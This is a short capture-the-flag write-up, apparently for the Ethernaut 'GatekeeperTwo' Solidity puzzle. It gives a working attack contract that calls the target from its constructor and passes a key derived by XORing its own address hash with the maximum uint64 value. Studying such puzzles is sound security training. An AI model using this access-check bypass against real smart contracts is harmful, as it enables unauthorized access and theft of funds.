## Description
I see 3 ways, through create2, to pick up on the algorithm of creating the address by hand, to write in the constructor yul insertion to search the number uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) in the binary system to get a number that with ^ will give type(uint64).max
TO DO

Took a break and as I came back I realized that I was digging a little wrong and things could be simpler.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract Attack {
    IGatekeeperTwo public gatekeeperOne;

    constructor(address _gatekeeperOne){
        gatekeeperOne = IGatekeeperTwo(_gatekeeperOne);
        gatekeeperOne.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max));
    }
  
}
```